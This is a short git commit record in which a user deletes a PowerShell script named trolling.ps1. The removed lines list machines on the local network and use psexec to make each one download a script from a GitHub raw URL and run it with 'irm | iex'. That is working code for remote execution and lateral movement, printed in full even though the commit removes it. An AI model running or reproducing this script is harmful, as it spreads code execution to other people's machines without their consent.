38f8bcd9f2d73d185b3f39acaef18d97b19c77d6
TheSashkin <74656533+TheSashkin@users.noreply.github.com>
2025-02-11 19:35:22 +0700

    Delete trolling.ps1

--- trolling.ps1
+++
@@ -1,4 +0,0 @@
-$computers = (net view | Select-String "\\" | ForEach-Object { $_.ToString().Trim().Split(" ")[0].Trim("\") })
-foreach ($computer in $computers) {
-    Start-Process -FilePath "psexec.exe" -ArgumentList "\\\\$computer \"powershell -Command irm https://raw.githubusercontent.com/TheSashkin/redirector/refs/heads/main/trolling.client.ps1 | iex\"" -NoNewWindow -Wait
-}
